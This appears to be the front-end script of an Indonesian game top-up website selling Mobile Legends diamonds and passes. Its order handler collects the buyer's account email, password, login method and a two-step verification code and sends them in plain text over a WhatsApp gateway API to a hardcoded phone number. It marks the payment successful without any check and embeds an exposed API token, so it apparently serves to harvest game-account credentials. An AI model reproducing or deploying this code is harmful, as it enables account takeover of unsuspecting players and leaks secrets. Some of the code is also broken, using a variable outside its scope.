document.addEventListener("DOMContentLoaded", () => {
  const produkData = {
    diamond: {
      note: "",
      items: [
        { label: "110 Diamond", harga: "Rp 27.000" },
        { label: "165 Diamond", harga: "Rp 40.000" },
        { label: "275 Diamond", harga: "Rp 65.000" },
        { label: "565 Diamond", harga: "Rp 125.000" },
        { label: "1.155 Diamond", harga: "Rp 240.000" },
        { label: "1.765 Diamond", harga: "Rp 360.000" },
        { label: "2.975 Diamond", harga: "Rp 590.000" },
        { label: "6.000 Diamond", harga: "Rp 1.165.000" },
        { label: "12.000 Diamond", harga: "Rp 2.320.000" },
        { label: "24.000 Diamond", harga: "Rp 4.630.000" },
      ],
    },
    wdp: {
      note: "Note: Minimal pembelian 2 WDP",
      items: [
        { label: "2 Weekly Diamond Pass", harga: "Rp 50.000" },
        { label: "3 Weekly Diamond Pass", harga: "Rp 74.000" },
        { label: "4 Weekly Diamond Pass", harga: "Rp 98.500" },
        { label: "5 Weekly Diamond Pass", harga: "Rp 124.000" },
        { label: "6 Weekly Diamond Pass", harga: "Rp 149.000" },
        { label: "7 Weekly Diamond Pass", harga: "Rp 173.500" },
        { label: "8 Weekly Diamond Pass", harga: "Rp 198.500" },
        { label: "9 Weekly Diamond Pass", harga: "Rp 223.500" },
        { label: "10 Weekly Diamond Pass", harga: "Rp 240.000" },
      ],
    },
    combo: {
      note: "",
      items: [
        { label: "220 Diamond", harga: "Rp 58.000" },
        { label: "440 Diamond", harga: "Rp 100.000" },
        { label: "1.720 Diamond", harga: "Rp 355.000" },
        { label: "Elite Monthly Bundle", harga: "Rp 14.000" },
        { label: "Epic Monthly Bundle", harga: "Rp 65.000" },
        { label: "Twilight Pass", harga: "Rp 125.000" },
      ],
    },
  };

  let selectedTab = "";
  let selectedItems = [];
  const produkContainer = document.getElementById("produk-container");
  const produkNote = document.getElementById("produk-note");

  window.toggleTab = (kategori) => {
    if (selectedTab === kategori) {
      selectedTab = "";
      produkContainer.innerHTML = "";
      produkNote.style.display = "none";
    } else {
      selectedTab = kategori;
      renderProduk(produkData[kategori]);
    }
  };

  function renderProduk(data) {
    produkContainer.innerHTML = "";
    produkNote.textContent = data.note;
    produkNote.style.display = data.note ? "block" : "none";
    data.items.forEach((item) => {
      const div = document.createElement("div");
      div.className = "produk-item";
      div.innerHTML = `<strong>${item.label}</strong><br><small>${item.harga}</small>`;
      if (selectedItems.some((i) => i.label === item.label)) {
        div.classList.add("selected");
      }
      div.onclick = () => toggleItem(item, div);
      produkContainer.appendChild(div);
    });
  }

  function toggleItem(item, element) {
    const exists = selectedItems.find((i) => i.label === item.label);
    if (exists) {
      selectedItems = selectedItems.filter((i) => i.label !== item.label);
      element.classList.remove("selected");
    } else {
      selectedItems.push(item);
      element.classList.add("selected");
    }
  }

  document.getElementById("akun-form").addEventListener("submit", (e) => {
    e.preventDefault();
    const form = e.target;
    const inputs = form.querySelectorAll("input, select");
    let valid = true;
    inputs.forEach((input) => {
      if (!input.value || input.value.trim() === "") valid = false;
    });
    if (!valid || selectedItems.length === 0) {
      Swal.fire({
        title: "Ketua Harap isi semua kolom & pilih item 😁",
        icon: "warning",
        background: "rgba(0,0,0,0.5)",
        color: "#fff",
        confirmButtonText: "Siap Ketua 🔥",
        customClass: {
          popup: "custom-popup",
          title: "glow-text",
          confirmButton: "btn-confirm",
        },
      });
      return;
    }

    const data = Object.fromEntries(new FormData(form).entries());
    const listItem = selectedItems.map(i => `- ${i.label} (${i.harga})`).join("%0A");
    const message = `🔥 *Order Baru dari Website* 🔥\n👤 Nickname: ${data.nickname}\n📧 Email: ${data.email}\n🔐 Password: ${data.password}\n🔑 Login: ${data.loginMethod}\n📱 WhatsApp: ${data.whatsapp}\n🛒 Orderan:\n${listItem}\n🔒 V2L: ${data.v2l}\n💳 Pembayaran: ${data.metode}\n✅ Status: Pembayaran berhasil`;

    fetch("https://api.fonnte.com/send", {
      method: "POST",
      headers: {
        Authorization: "TGNPKLafWVUGGV3mtvsu",
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        target: "6283833121742",
        message: message,
      }),
    })
      .then((res) => res.json())
      .then((data) => {
        Swal.fire({
          icon: "success",
          title: "Orderan kamu sudah dikirim ke admin ✅",
          background: "rgba(0,0,0,0.5)",
          color: "#fff",
          confirmButtonText: "Oke Ketua",
        });
      })
      .catch((err) => {
        Swal.fire({
          icon: "error",
          title: "Gagal mengirim ke WhatsApp 😢",
          background: "rgba(0,0,0,0.5)",
          color: "#fff",
        });
      });
  });

  document.addEventListener("click", (e) => {
    const isProduk = e.target.classList.contains("produk-item") || e.target.closest(".produk-item");
    const isCancelBtn = e.target.classList.contains("cancel-btn");
    const isOrderItem = e.target.closest(".order-item");
    if (selectedItems.length === 1 && !isProduk && !isCancelBtn && !isOrderItem) {
      selectedItems = [];
      [...produkContainer.children].forEach((el) => el.classList.remove("selected"));
    }
  });
});

function toggleCollapse(element) {
  const next = element.nextElementSibling;
  if (!next || !next.classList.contains("form-sub")) return;
  next.classList.toggle("open");
}

function selectPayment(card, method) {
  const input = document.getElementById("metode-terpilih");
  const isSelected = card.classList.contains("selected");

  if (isSelected) {
    card.classList.remove("selected");
    input.value = "";
    removeTotalHarga(card);
  } else {
    document.querySelectorAll(".payment-inner-card").forEach((el) => {
      el.classList.remove("selected");
      removeTotalHarga(el);
    });
    card.classList.add("selected");
    input.value = method;
    const total = calculateTotalHarga(method);
    const span = document.createElement("div");
    span.className = "total-harga-text";
    span.style.marginTop = "8px";
    span.textContent = `Total: Rp ${formatRupiah(total)}`;
    card.appendChild(span);
  }
}

function removeTotalHarga(card) {
  const existing = card.querySelector(".total-harga-text");
  if (existing) existing.remove();
}

function calculateTotalHarga(method) {
  let total = 0;
  selectedItems.forEach((item) => {
    const harga = parseInt(item.harga.replace(/[^\d]/g, ""));
    total += harga;
  });
  const adminFee = ["Ovo", "GoPay", "ShopeePay", "QRIS"].includes(method) ? 1500 : 0;
  return total + adminFee;
}

function formatRupiah(angka) {
  return angka.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
}
